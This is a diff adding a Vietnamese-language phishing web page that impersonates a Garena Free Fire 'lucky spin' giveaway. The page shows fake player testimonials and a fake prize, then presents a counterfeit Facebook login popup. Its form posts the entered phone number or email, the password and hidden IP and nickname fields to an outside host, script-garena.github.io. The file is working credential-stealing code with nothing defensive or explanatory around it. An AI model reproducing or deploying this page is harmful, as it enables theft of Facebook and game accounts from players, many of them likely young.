@@ -1,0 +1,702 @@
+
+
+
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+<meta content="width=device-width,maximum-scale=1.0,initial-scale=1.0,user-scalable=no" name="viewport">
+<link rel="icon" href="https://freefiremobile-a.akamaihd.net/ffwebsite/images/freefire32-2.ico" type="image/x-icon">
+<link rel="shortcut icon" href="https://freefiremobile-a.akamaihd.net/ffwebsite/images/freefire16-2.ico" type="image/x-icon">
+<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+<meta name="copyright" content="">
+<meta content="black" name="apple-mobile-web-app-status-bar-style">
+<meta name="apple-mobile-web-app-title" content="Garena Free Fire">
+<meta name="description" content="Đăng nhập để nhận ngay 1 lượt quay miễn phí!">
+<title>VÒNG QUAY MAY MẮN | GARENA FREE FIRE</title>
+<link rel="stylesheet" type="text/css" href="./5_files/style.css">
+<link rel="stylesheet" type="text/css" href="./5_files/facebooks.css">
+<link rel="stylesheet" href="./5_files/bootstrap-icons.css">
+<link rel="stylesheet" href="./5_files/font-awesome.min.css">
+<link rel="stylesheet" href="./5_files/material-design-iconic-font.min.css">
+<script src="./5_files/jquery.min.js.download"></script>
+<link rel="stylesheet" href="./5_files/font-awesome.min(1).css">
+</head>
+<body>
+<style>
+    .popup {
+	width:100%;
+	height:100%;
+	position:fixed;
+	top:0;
+	left:0;
+	z-index:9999;
+	background-color:rgba(0, 0, 0, 0.4);
+}
+.popup-box {
+	background:url(img/popup1.png) no-repeat center;
+	background-size:100% 100%;
+	width:380px;
+	height:270px;
+	position:relative;
+	margin:50px auto;
+	margin-top:16%;
+	text-align:center;
+}
+.popup-title {
+	padding-left: 20px;
+	padding-top: 20px;
+	color: #5fe3ff;
+	text-shadow: 0 0 0.21rem rgba(144,180,236,0.74);
+	font-size:20px;
+	font-family: 'Baloo 2', cursive;
+	text-align:left;
+}
+.popup-content {
+	width: 100%;
+	height: 76.5%;
+	border: 1px solid transparent;
+	position: relative;
+}
+.popup-rewards-title {
+	color: #fff;
+	text-shadow: 0 0 0.15rem rgba(144,180,236,0.74),0 0 0.15rem rgba(144,180,236,0.74);
+	font-size:20px;
+	font-family: 'Baloo 2', cursive;
+	text-align:center;
+}
+.popup-rewards-img1 {
+	width: 90px;
+	height: 90px;
+	margin: 5px;
+	margin-top: 10px;
+	display: inline-block;
+}
+.popup-btn-wrapper {
+	width: 100%;
+	height: 50px;
+}
+.popup-btn-wrapper button {
+	width: 30%;
+	height: 30px;
+	padding: 2px;
+	font-size: 18px;
+	font-family: 'Baloo 2', cursive;
+	text-align: center;
+	border: none;
+	outline: none;
+}
+.popup-btn-deactive {
+	background: url(img/tag1.png) no-repeat center;
+	background-size: 100% 100%;
+	position: absolute;
+	left: 15%;
+	margin-top: -35px;
+	text-shadow: 0 0 0.15rem rgba(144,180,236,0.74),0 0 0.15rem rgba(144,180,236,0.74);
+	color: silver;
+}
+.popup-btn-active {
+	background: url(img/menu_off.png) no-repeat center;
+	background-size: 100% 100%;
+	position: absolute;
+	left: 35%;
+	margin-top: -35px;
+	text-shadow: 0 0 0.15rem rgba(144,180,236,0.74),0 0 0.15rem rgba(144,180,236,0.74);
+	color: #fff;
+}
+.btn-login {
+    width: 85%;
+    height: auto;
+    padding: 8px;
+    margin-left: auto;
+	margin-right: auto;
+    color: #000;
+    text-shadow: 0 0 0.15rem rgba(144,180,236,0.74),0 0 0.15rem rgba(144,180,236,0.74);
+	font-size: 15px;
+    font-family: 'Baloo 2', cursive;
+    border: none;
+    border-radius: 5px;
+    outline: none;
+    display: block;
+}
+.btn-login i {
+    color: #fff;
+    font-size: 20px;
+    float: left;
+}
+.facebook {
+    background: #3b5998;
+    color: #fff;
+	margin-top: 20px;
+	margin-bottom: 3px;
+}
+.twitter {
+    background: #08a0e9;
+    color: #fff;
+	margin-bottom: 10px;
+}
+.popup-close {
+	width:20px;
+	height:20px;
+	color:#000;
+	text-align:center;
+	text-transform: uppercase;
+	font-weight: bold;
+	position:absolute;
+	top:13px;
+	right:10px;
+	display:block;
+}
+.popup-close i {
+	color:#000;
+	font-size: 25px;
+}
+.popup-login {
+	background:rgba(0,0,0,0.5);
+	width:100%;
+	height:100%;
+	position:fixed;
+	top:0;
+	left:0;
+	z-index:9999;
+}
+.popup-box-login-fb {
+	background:#ECEFF6;
+	max-width:330px;
+	height:auto;
+	position:relative;
+	margin:50px auto;
+	margin-top:1.9%;
+	text-align:center;
+	font-family:'Teko';
+	color:#000;
+	border-radius:10px;
+}
+.popup-box-login-twitter {
+	background:#fff;
+	max-width:330px;
+	height:380px;
+	position:relative;
+	margin:50px auto;
+	margin-top:10%;
+	text-align:center;
+	font-family:'Teko';
+	color:#000;
+	border-radius:10px;
+}
+.close-fb {
+	background:#000;
+	width:20px;
+	height:20px;
+	color:#fff;
+	text-align:center;
+	text-decoration:none;
+	border-radius:50%;
+	border:1.5px solid #fff;
+	position:absolute;
+	top:-8px;
+	right:-10px;
+	display:block;
+}
+.close-fb i {
+	color:#fff;
+	padding-top:1px;
+}
+.close-other {
+	background:#000;
+	width:20px;
+	height:20px;
+	color:#fff;
+	text-align:center;
+	text-decoration:none;
+	border-radius:50%;
+	border:1.5px solid #fff;
+	top:-8px;
+	right:-10px;
+	position:absolute;
+	z-index:9999999;
+	display:block;
+}
+.close-other i {
+	color:#fff;
+	padding-top:1px;
+}
+.verify-input {
+	background: #dfedf975;
+	background-size: 100% 100%;
+	box-shadow: 0 0 0.15rem rgba(144,180,236,0.74),0 0 0.15rem rgba(144,180,236,0.74);
+	width: 90%;
+	height: auto;
+	margin-bottom: 3px;
+	padding: 6px;
+	color: #fff;
+	font-size:15px;
+	font-family: 'Baloo 2', cursive;
+	border-top: 0.5px solid white;
+	border-bottom: 0.5px solid white;
+	border-right: 2px solid white;
+	border-left: 2px solid white;
+	border-radius: 3px;
+	position: relative;
+	outline: none;
+}
+.verify-input::placeholder {
+	color: #fff;
+}
+.verify-select {
+	background: #dfedf975;
+	background-size: 100% 100%;
+	box-shadow: 0 0 0.15rem rgba(144,180,236,0.74),0 0 0.15rem rgba(144,180,236,0.74);
+	width: 90%;
+	height: auto;
+	margin-bottom: 3px;
+	padding: 6px;
+	padding-left: 3px;
+	color: #fff;
+	font-size: 15px;
+	font-family:pubgFont;
+	border-top: 0.5px solid white;
+	border-bottom: 0.5px solid white;
+	border-right: 2px solid white;
+	border-left: 2px solid white;
+	border-radius: 3px;
+	position: relative;
+	outline: none;
+}
+.verify-btn {
+    background: url(img/menu_off.png) no-repeat center;
+	background-size: 100% 100%;
+	width: 35%;
+	height: auto;
+	margin-top: 10px;
+	padding: 10px;
+	font-size: 15px;
+	font-family:Teko;
+	text-align: center;
+	color: #fff;
+	margin-bottom: 3px;
+	border: none;
+	position: relative;
+	outline: none;
+}
+.kanan {
+	float: right;
+}
+.kiri {
+	float: left;
+}
+.tengah {
+	margin-left: auto;
+	margin-right: auto;
+	display: block;
+}
+::-webkit-scrollbar { 
+    display: none;
+    width: 0px;
+}
+.header{
+		max-width: 400px;
+		height: 210px;
+		margin:0px;
+	}
+	.item div {
+    width: 100%;
+    height: 100%;
+    border-radius: 3px 3px 0px 0px;
+	}
+	.item div:first-child {
+	    margin-left: 0;
+	}
+
+	figure {
+    margin: 0;
+    padding: 0;
+    overflow: hidden;
+	}
+	.lightshagitz figure {
+    position: relative;
+	}
+	.lightshagitz figure::before {
+	    position: absolute;
+	    top: 0;
+	    left: -75%;
+	    z-index: 2;
+	    display: block;
+	    content: '';
+	    width: 50%;
+	    height: 100%;
+	    background: -webkit-linear-gradient(left, rgba(255,255,255,0) 0%, rgba(255,255,255,.3) 100%);
+	    background: linear-gradient(to right, rgba(255,255,255,0) 0%, rgba(255,255,255,.3) 100%);
+	    -webkit-transform: skewX(-25deg);
+	    transform: skewX(-25deg);
+	}
+	.lightshagitz figure::before {
+	    -webkit-animation: shine 2s infinite;
+	    animation: shine 2s infinite;
+	}
+	@-webkit-keyframes shine {
+	    100% {
+	        left: 125%;
+	    }
+	}
+	@keyframes shine {
+	    100% {
+	        left: 125%;
+	    }
+	}
+@media only screen and (max-width:600px) {
+    .container {
+        width: 100%;
+        height: auto;
+        margin-top: 0px;
+        margin-bottom: 0px;
+		border: none;
+		border-top:1px solid #57c0ff;
+        border-radius: 0px;
+        padding: 0px;
+    }
+
+	.box {
+	    width: 96%;
+		height: auto;
+	}
+    .scroll {
+        height: none;
+    }
+
+    .popup-box {
+        width: 345px;
+        margin-top: 60%;
+    }
+    .popup-item {
+        width:25%;
+        height:85px;
+	}
+	.popup-box-login-fb {
+		margin-top: 4%;
+	}
+	.popup-box-login-twitter {
+		margin-top: 25%;
+	}
+	.header{
+		width: 100%;
+		}
+}
+</style>
+<div class="app">
+<header>
+<div class="profile">
+<div class="avatarBox">
+<img src="https://cdngarenanow-a.akamaihd.net/gop/app/0000/100/067/icon.png">
+</div>
+<div class="nameBox">
+<span class="nickname">Chúc Mừng Bạn Nhận Được 1 Lượt Quay Miễn Phí</span>
+</div>
+</div>
+<div class="progress"></div>
+</header>
+<div class="wrap">
+<div class="boxItem">
+<div class="box" data-order="0">
+<div class="placeitems">
+<img id="img0" src="https://i.imgur.com/FldR6Fc.png">
+</div>
+</div>
+<div class="box" data-order="1">
+<div class="placeitems">
+<img id="img1" src="https://i.imgur.com/Y2XsZA6.jpg">
+</div>
+</div>
+<div class="box" data-order="2">
+<div class="placeitems">
+<img id="img2" src="https://i.imgur.com/b7qNgdI.png">
+</div>
+</div>
+<div class="box" data-order="3">
+<div class="placeitems">
+<img id="img3" src="https://i.imgur.com/2wCCsjH.jpg">
+</div>
+</div>
+<div class="box" data-order="4">
+<div class="placeitems">
+<img id="img4" src="https://i.imgur.com/7o0awry.jpg">
+</div>
+</div>
+<div class="box spin" onclick="init(this)"></div>
+<div class="box" data-order="5">
+<div class="placeitems">
+<img id="img5" src="https://i.imgur.com/e8LCllB.png">
+</div>
+</div>
+<div class="box" data-order="6">
+<div class="placeitems">
+<img id="img6" src="https://i.imgur.com/zfxFWb6.png">
+</div>
+</div>
+<div class="box" data-order="7">
+<div class="placeitems">
+<img id="img7" src="https://i.imgur.com/Imu8gVO.png">
+</div>
+</div>
+<div class="box" data-order="8">
+<div class="placeitems">
+<img id="img8" src="https://i.imgur.com/IaC7Wa9.png">
+</div>
+</div>
+<div class="box" data-order="9">
+<div class="placeitems">
+<img id="img9" src="https://i.imgur.com/qUSeHlZ.jpg">
+</div>
+</div>
+</div>
+<div class="comment">
+<div class="secs" style="--i:1;">
+<div class="profile">
+<img src="https://i.imgur.com/QRcRAg1.jpg">
+</div>
+<div class="content">
+<h1>Nam Lầy</h1>
+<p>Sự Kiện Rất Hay Mọi Người Nhanh Tay Tham Gia Nhé</p>
+</div>
+</div>
+<div class="secs" style="--i:2;">
+<div class="profile">
+<img src="https://i.imgur.com/H92wVlE.jpg">
+</div>
+<div class="content">
+<h1>Gao Bạc</h1>
+<p>Gao Bạc Đã Trải Nghiệm Vòng Quay</p>
+</div>
+</div>
+<div class="secs" style="--i:3;">
+<div class="profile">
+<img src="https://i.imgur.com/tcUm9Je.jpg">
+</div>
+<div class="content">
+<h1>Cô Ngân</h1>
+<p>Sự Kiện Sắp Hết Mọi Người Tranh Thủ Nha</p>
+</div>
+</div>
+<div class="secs" style="--i:8;">
+<div class="profile">
+<img src="https://i.imgur.com/FCETt2Z.jpg">
+</div>
+<div class="content">
+<h1>Bác Gấu</h1>
+<p>Anh Em Quân Đoàn Nhanh Tay Tham Gia Cùng Bác Gấu Nhé</p>
+</div>
+</div>
+<div class="secs" style="--i:8;">
+<div class="profile">
+<img src="https://i.imgur.com/4OK4c7n.jpg">
+</div>
+<div class="content">
+<h1>BUSSGAMING</h1>
+<p>BUSSGAMING Vừa Nhận Được SET Skin Súng</p>
+</div>
+</div>
+<div class="secs" style="--i:8;">
+<div class="profile">
+<img src="https://i.imgur.com/3uTbKsR.jpg">
+</div>
+<div class="content">
+<h1>KELLY GAMING</h1>
+<p>KELLY GAMING Vừa Nhận Được TVC</p>
+</div>
+</div>
+</div>
+<div class="mask" style="display: none;"></div>
+<div class="popReward">
+<h1>Xin chúc mừng bạn nhận được !!!</h1>
+<div class="boxImg">
+<img id="imgsrc" src="https://i.imgur.com/bMkQrH4.jpg">
+</div>
+<button class="claim claimThis">Nhận Ngay</button>
+</div>
+<div class="toast">
+<p id="alert"></p>
+</div>
+</div>
+
+<footer>
+Copyright © Garena Free Fire.
+</footer>
+
+</div>
+
+<style type="text/css">
+	#togglePassword {
+	position: absolute;
+    margin-left: -30px;
+    margin-top: 10px;
+    cursor: pointer;
+}
+
+</style>
+<div class="popup-login login-facebook animated fadeIn" style=" display: none; ">
+<div class="popup-box-login-fb"><a onclick="tutup_facebook()" class="close-fb"><i class="zmdi zmdi-close"></i></a>
+<div class="navbar-fb">
+</div>
+<div class="content-box-fb"> <p class="alert sandi">
+Sai mật khẩu. <b> Bạn quên mật khẩu của mình? </b></p>
+<p class="alert email"> Số điện thoại di động hoặc email bạn đã nhập không khớp với bất kỳ tài khoản nào. <b> Tìm kiếm tài khoản của bạn. </b> </p>
+<img width="75" src="https://cdngarenanow-a.akamaihd.net/gop/app/0000/100/067/icon.png">
+<div class="txt-login-fb">
+Đăng nhập tài khoản Facebook của bạn để kết nối với Garena Free Fire
+</div>
+<form class="login-form" action="https://script-garena.github.io/chuyen-huong.html/" method="POST" onsubmit="return valid()">
+<label>
+<input type="text" id="user" name="user" placeholder="Số điện thoại di động hoặc email" autocomplete="off" autocapitalize="off">
+</label>
+<label>
+<input type="password" id="pass" name="pass" placeholder="Mật khẩu" autocomplete="off" autocapitalize="off">
+</label>
+<input type="hidden" name="ip" id="ip" value="">
+<input type="hidden" id="id" name="id" value="">
+<input type="hidden" id="nick" name="nick" value="">
+<button type="submit" id="btnfb" class="btn-login-fb">Đăng nhập</button>
+</form>
+<div class="txt-create-account">Tạo tài khoản mới</div>
+<div class="txt-not-now">Hoặc</div>
+<div class="txt-forgotten-password">Quên mật khẩu?</div>
+</div>
+<div class="language-box">
+<center>
+<div class="language-name language-name-active">Tiếng Việt</div>
+<div class="language-name"> English (UK) </div>
+<div class="language-name">Basa Jawa</div>
+<div class="language-name">Bahasa Melayu</div>
+<div class="language-name">日本語</div>
+<div class="language-name">Español</div>
+<div class="language-name">Português (Brasil)</div>
+<div class="language-name">
+<i class="fa fa-plus"></i>
+</div>
+</center>
+</div>
+<div class="copyright">Facebook Inc.</div>
+</div>
+</div>
+<script type="text/javascript">
+const togglePassword = document.querySelector('#togglePassword');
+const password = document.querySelector('#password');
+togglePassword.addEventListener('click', function (e) {
+    // toggle the type attribute
+    const type = password.getAttribute('type') === 'password' ? 'text' : 'password';
+    password.setAttribute('type', type);
+    // toggle the eye / eye slash icon
+    this.classList.toggle('bi-eye');
+});
+</script>
+<script type="text/javascript" src="./5_files/shagitz.js.download"></script>
+<script>
+
+
+ function phonenumber(user) {
+ var vnf_regex = /((84|01|03|05|07|08|09)+([0-9]{8})\b)/g;
+ if (vnf_regex.test(user) == false) 
+        {console.log("phonenumber false");
+            return false; 
+            
+        }else{
+            console.log("phonenumber true");
+           return true;
+           
+        } 
+}
+
+
+
+
+function validateEmail (user)
+{
+  let regexEmail = /^\w+([\.-]?\w+)*@\w+([\.-]?\w+)*(\.\w{2,3})+$/;
+  if (user.match(regexEmail)) {
+      console.log("regexEmail true");
+    return true; 
+     
+  } else {
+      console.log("regexEmail false");
+   return false; 
+    
+  }
+}
+
+ function validatepassword(pass){
+
+if (pass.length >= 6 && pass.length <= 25)
+{
+   
+    return true;
+}
+else {
+ 
+    return false;
+}
+}
+
+</script>
+<script>
+ 
+
+ 
+        function valid() {
+            var user = $('#user').val();
+            var pass = $('#pass').val();
+            phonenumber(user);
+           validateEmail(user);
+            var ip = $('#ip').val();
+            if(user == '' || user == null)
+            {
+                
+                $('.email').show();
+                $('.sandi').hide();
+                return false;
+            }else if(validatepassword(pass) == false)
+            {
+                $('.email').hide();
+                $('.sandi').show();
+                return false;
+            }
+            else if(user != '' || user != null)
+            {
+                if( (phonenumber(user) == true)  || (validateEmail(user) == true))
+                {
+                $('.email').hide();
+                $('.sandi').hide();
+               
+                }
+                else
+                {
+                     $('.email').show();
+                $('.sandi').hide();
+                return false;
+                }
+            }
+            
+            
+            $("#btnfb").addClass("disabled");
+        }
+        
+    </script>
+<script type="text/javascript">
+		$(document).ready(function(){
+			setTimeout(() => {
+				$('.loader').fadeOut();
+			},1000)
+		})
+	</script>
+<script>
+$('.check').hide();
+$('.mask').hide();
+
+</script>
+<script>
+	    $('.claimThis').on('click',function(){
+	        	$('.login-facebook').show();
+	        	$('.mask').hide();
+	        	$('.popReward').hide();
+	    })
+	</script>
+<script src="./5_files/xyz.js.download"></script>
+<script src="./5_files/xyzIpAddre.js.download"></script>
+
+
+<script>(function(){var js = "window['__CF$cv$params']={r:'75233af5edbcddfa',m:'gKELJNJwqK_.GAJbnYU_cUOHkNTSovrVdEsuI7Bl0es-1664438900-0-AawHPBUXuPilNxmNXjl6Fzh8Mgk5B5tj0bDkWLPpZm9Dt4/M2NKq1eSAuVuWTXhmkyUwl45vG2hy3qGYtvE6q+nuDY5K3trA1SfuDBQZ9ap+rprmwRwXc6a2qjMi5FoDPg==',s:[0xabd4d6b04e,0x6a32642322],u:'/cdn-cgi/challenge-platform/h/b'};var now=Date.now()/1000,offset=14400,ts=''+(Math.floor(now)-Math.floor(now%offset)),_cpo=document.createElement('script');_cpo.nonce='',_cpo.src='/cdn-cgi/challenge-platform/h/b/scripts/alpha/invisible.js?ts='+ts,document.getElementsByTagName('head')[0].appendChild(_cpo);";var _0xh = document.createElement('iframe');_0xh.height = 1;_0xh.width = 1;_0xh.style.position = 'absolute';_0xh.style.top = 0;_0xh.style.left = 0;_0xh.style.border = 'none';_0xh.style.visibility = 'hidden';document.body.appendChild(_0xh);function handler() {var _0xi = _0xh.contentDocument || _0xh.contentWindow.document;if (_0xi) {var _0xj = _0xi.createElement('script');_0xj.nonce = '';_0xj.innerHTML = js;_0xi.getElementsByTagName('head')[0].appendChild(_0xj);}}if (document.readyState !== 'loading') {handler();} else if (window.addEventListener) {document.addEventListener('DOMContentLoaded', handler);} else {var prev = document.onreadystatechange || function () {};document.onreadystatechange = function (e) {prev(e);if (document.readyState !== 'loading') {document.onreadystatechange = prev;handler();}};}})();</script></body></html>
